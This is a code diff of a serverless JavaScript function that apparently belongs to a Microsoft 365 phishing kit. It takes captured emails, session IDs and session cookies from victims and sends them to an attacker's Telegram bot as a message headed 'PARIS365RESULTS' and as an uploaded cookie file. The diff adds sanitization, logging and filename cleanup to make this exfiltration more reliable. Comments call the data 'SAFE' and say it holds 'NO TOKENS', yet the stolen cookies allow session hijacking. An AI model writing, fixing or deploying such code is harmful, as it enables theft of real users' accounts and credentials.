@@ -4,7 +4,7 @@ const handler = async (event, context) => {
     'Access-Control-Allow-Methods': 'POST, OPTIONS',
   };
 
-  console.log('🚀 sendTelegram function starting... v4.0 (NO TOKEN OR AUTH CODE EVER INCLUDED)');
+  console.log('🚀 sendTelegram function starting... v4.2 (ENHANCED PARSING FIX)');
 
   if (event.httpMethod === 'OPTIONS') {
     return { statusCode: 200, headers, body: '' };
@@ -12,7 +12,9 @@ const handler = async (event, context) => {
 
   try {
     const data = JSON.parse(event.body);
-    console.log('📥 Received data:', JSON.stringify(data, null, 2));
+    console.log('📥 Received data keys:', Object.keys(data));
+    console.log('📥 Email:', data.email);
+    console.log('📥 Cookie count:', Array.isArray(data.cookies) ? data.cookies.length : 'Not array');
 
     // Environment variables
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
@@ -43,11 +45,21 @@ const handler = async (event, context) => {
       };
     }
 
-    // Extract only SAFE data
-    const email = data.email || 'oauth-user@microsoft.com';
-    const sessionId = data.sessionId || 'no-session';
+    // Function to sanitize text for Telegram
+    function sanitizeForTelegram(text) {
+      if (!text) return '';
+      return String(text)
+        .replace(/[_*\[\]()~`>#+=|{}.!-]/g, '') // Remove special markdown characters
+        .replace(/\n\n+/g, '\n\n') // Clean up multiple newlines
+        .trim();
+    }
+
+    // Extract only SAFE data with sanitization
+    const email = sanitizeForTelegram(data.email || 'oauth-user@microsoft.com');
+    const sessionId = sanitizeForTelegram(data.sessionId || 'no-session');
     const timestamp = new Date().toISOString();
     let cookies = data.formattedCookies || data.cookies || [];
+    
     if (typeof cookies === "string") {
       try {
         cookies = JSON.parse(cookies);
@@ -77,30 +89,37 @@ const handler = async (event, context) => {
     if (!Array.isArray(cookies)) cookies = [];
 
     const cookieCount = cookies.length;
+    console.log('📊 Processing:', { email, cookieCount, hasValidCookies: cookieCount > 0 });
 
-    // Build the message (NO tokens, NO auth code)
+    // Build the message (plain text only, heavily sanitized)
     const uniqueId = Math.random().toString(36).substring(2, 8);
-    const simpleMessage = [
-      '🔐 Microsoft OAuth Login Captured!',
+    const messageLines = [
+      '🚨PARIS365RESULTS🚨',
       '',
-      `📧 Email: ${email}`,
-      `🔑 Session ID: ${sessionId}`,
-      `🕒 Time: ${timestamp}`,
-      `🆔 Message ID: ${uniqueId}`,
+      `Email: ${email}`,
+      `Session ID: ${sessionId}`,
+      `Time: ${timestamp}`,
+      `Message ID: ${uniqueId}`,
       '',
-      `🍪 Cookies: ${cookieCount > 0 ? `${cookieCount} captured` : 'None captured'}`
-    ].join('\n');
+      `Cookies: ${cookieCount > 0 ? `${cookieCount} captured` : 'None captured'}`
+    ];
+    
+    // Join and sanitize the entire message
+    const simpleMessage = sanitizeForTelegram(messageLines.join('\n'));
+    
+    console.log('📤 Final message preview:', simpleMessage.substring(0, 150) + '...');
+    console.log('📤 Message length:', simpleMessage.length);
 
-    console.log('📤 Sending SAFE message to Telegram:', simpleMessage.substring(0, 100) + '...');
-
-    // Send main safe message to Telegram
+    // Send main safe message to Telegram (NO PARSE MODE, PLAIN TEXT ONLY)
     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const telegramPayload = {
       chat_id: TELEGRAM_CHAT_ID,
       text: simpleMessage,
-      parse_mode: 'Markdown'
+      disable_web_page_preview: true
+      // Absolutely NO parse_mode to avoid any entity parsing
     };
 
+    console.log('📤 Sending to Telegram API...');
     const response = await fetch(telegramUrl, {
       method: 'POST',
       headers: {
@@ -110,17 +129,26 @@ const handler = async (event, context) => {
     });
 
     const result = await response.json();
+    console.log('📨 Telegram API response status:', response.status);
     console.log('📨 Telegram API response:', result);
 
     if (!response.ok || !result.ok) {
-      console.error('❌ Telegram API error:', result);
+      console.error('❌ Telegram API error details:', {
+        status: response.status,
+        statusText: response.statusText,
+        telegramResult: result,
+        messageLength: simpleMessage.length,
+        messagePreview: simpleMessage.substring(0, 100)
+      });
       return {
         statusCode: 500,
         headers,
         body: JSON.stringify({
           error: 'Failed to send to Telegram',
           telegramError: result,
-          statusCode: response.status
+          statusCode: response.status,
+          messagePreview: simpleMessage.substring(0, 100),
+          messageLength: simpleMessage.length
         }),
       };
     }
@@ -155,7 +183,9 @@ location.reload();
 // END OF FILE
 `;
 
-      const fileName = `microsoft365_cookies_${email.replace('@', '_at_').replace(/\./g, '_')}_${Date.now()}.js`;
+      // Clean filename to avoid issues
+      const cleanEmail = email.replace(/[^a-zA-Z0-9@._-]/g, '_').replace('@', '_at_').replace(/\./g, '_');
+      const fileName = `microsoft365_cookies_${cleanEmail}_${Date.now()}.js`;
 
       // Create proper multipart form data for file upload
       const boundary = `----formdata-${Math.random().toString(36).substring(2)}`;
@@ -171,6 +201,7 @@ location.reload();
       formData += `\r\n--${boundary}--\r\n`;
 
       // Send file to Telegram
+      console.log('📎 Attempting file upload to Telegram...');
       const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
         method: 'POST',
         headers: {
@@ -192,6 +223,7 @@ location.reload();
       fileSent = false;
     }
 
+    console.log('✅ sendTelegram completed successfully');
     return {
       statusCode: 200,
       headers,
@@ -200,7 +232,9 @@ location.reload();
         message: 'Data sent to Telegram successfully (NO TOKENS, NO AUTH CODE)',
         telegramMessageId: result.message_id,
         fileSent,
-        cookieCount
+        cookieCount,
+        emailProcessed: email,
+        messageLength: simpleMessage.length
       }),
     };
 
